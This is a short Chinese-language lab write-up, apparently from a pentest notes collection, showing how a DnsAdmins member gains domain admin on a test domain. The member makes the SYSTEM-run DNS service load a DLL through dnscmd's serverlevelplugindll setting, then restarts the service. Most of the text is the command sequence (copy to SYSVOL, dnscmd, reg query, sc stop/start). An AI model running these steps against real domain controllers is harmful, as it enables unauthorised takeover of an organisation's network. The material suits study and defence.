## 0x01.背景

实验利用Dns Administrators 组成员，通过远程配置Dns服务，进行`Dll inject`从而实现特权提升。  
在域内，Dns server 通常为Dc Server,Dns服务器管理基于rpc，通过调用`c:\windows\system32\dns.exe`,创建Rpc接口，使用`\PIPE\DNSSERVER`命名管道进行传输。

DNS服务默认ACL 如下图：

![](../Images/11df63fa837047ac2a8bfa9a8f0e457d.png)

DNS.exe 默认启动权限为`NT AUTHORITY\SYSTEM`：

![](../Images/af57d2b320d8cdaa8664229c1a3c5185.png)

### 0x0202 特权提升：

首先找到Dnsadmins

```
1.  `net user sixth-hospital /domain`
    
```

![](../Images/3276fd819748d6403fda4ad28c6b49c1.png)

将dll 复制到sysvol

```
1.  `copy Dlldns.dll \\WIN-43QM2N9GRC4.hackhello.local\sysvol\hackhello.local\scripts`
    
```

使用当前用户列举AD c盘

```
1.  `dir \\WIN-43QM2N9GRC4.hackhello.local\c$`
    
```

![](../Images/6802236a137d580c3d050cf0bc2d84b8.png)

执行dnscmd 配置调用dll

```
1.  `dnscmd WIN-43QM2N9GRC4.hackhello.local /config /serverlevelplugindll \\WIN-43QM2N9GRC4.hackhello.local\sysvol\hackhello.local\scripts\Dlldns.dll`
    
```

![](../Images/2dc13a38377512c38521e8d2e41e6930.png)

此时查看dc注册表，已经配置好了dll路径。

```
1.  `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters`
    
```

![](../Images/07314294e566a9ac6009d9778a27be63.png)

重启dns

```
1.  `sc stop dns`
    
2.  `sc start dns`
    
```

![](../Images/2564ba2f96cb9b973d80594699deacf4.png)

重启完服务后再执行net命令

```
1.  `net user sixth-hospital /domain`
    
```

![](../Images/ef79035b861ee16be3b13fedae489ffb.png)

可以看到已经成功将Dnsadmins用户提升至域管理员权限
